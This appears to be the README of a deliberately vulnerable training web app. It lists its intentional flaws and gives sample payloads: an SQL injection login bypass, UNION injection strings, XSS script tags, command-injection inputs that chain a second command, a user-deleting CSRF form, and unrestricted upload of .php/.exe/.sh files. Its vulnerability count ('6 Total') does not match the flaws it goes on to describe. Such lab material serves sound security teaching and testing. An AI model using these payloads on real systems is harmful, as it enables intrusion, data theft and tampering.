# Vulnerable Web Application

A deliberately insecure web application for security testing and educational purposes.

## Warning

**DO NOT DEPLOY TO PRODUCTION OR PUBLIC SERVERS**

This application contains intentional security vulnerabilities and should only be used in controlled testing environments.

## Features

### Included Vulnerabilities (6 Total)

1. **SQL Injection** (4 endpoints)
   - Login form (`/login`)
   - Search functionality (`/search`)
   - User profile (`/profile`)
   - Posts list (`/posts`)

2. **Reflected XSS** (1 endpoint)
   - Search results (`/search`)

3. **Stored XSS** (1 endpoint)
   - Blog comments (`/post/<id>/comment`)

## Setup

```bash
cd vulnerable_app
python app.py
```

The application will start on `http://127.0.0.1:8080`

## Test Credentials

| Username | Password    | Role  |
|----------|-------------|-------|
| admin    | admin123    | Admin |
| user1    | password123 | User  |
| john     | john123     | User  |
| alice    | alice456    | User  |

## Testing Examples

### SQL Injection

**Login Bypass:**
```
Username: admin' OR '1'='1
Password: anything
```

**Union-based SQL Injection:**
```
/search?q=' UNION SELECT 1,2,3,4--
/profile?id=1 UNION SELECT 1,2,3,4,5--
```

**Error-based SQL Injection:**
```
/login
Username: admin'
Password: test
```

### XSS

**Reflected XSS:**
```
/search?q=<script>alert('XSS')</script>
```

**Stored XSS:**
Post a comment with:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### Command Injection

```
/api/exec?cmd=whoami
/api/exec?cmd=dir
/api/exec?cmd=echo Hello && dir
```

### File Upload

Upload any file type (including .php, .exe, .sh) without restrictions.

### CSRF

Delete a user without CSRF token:
```html
<form action="http://127.0.0.1:8080/admin/delete_user" method="POST">
  <input name="user_id" value="2">
  <input type="submit" value="Delete User">
</form>
```

### Broken Access Control

Access admin panel without authentication:
```
/admin/users
```

## Database Structure

### Users Table
- id (INTEGER)
- username (TEXT)
- password (TEXT)
- email (TEXT)
- role (TEXT)

### Posts Table
- id (INTEGER)
- title (TEXT)
- content (TEXT)
- author (TEXT)
- created_at (TIMESTAMP)

### Comments Table
- id (INTEGER)
- post_id (INTEGER)
- comment (TEXT)
- author (TEXT)
- created_at (TIMESTAMP)

## Security Testing

Use this application with security scanning tools like:
- Web Security Scanner (this project)
- OWASP ZAP
- Burp Suite
- SQLMap
- Nikto

## License

For educational purposes only. Use at your own risk.
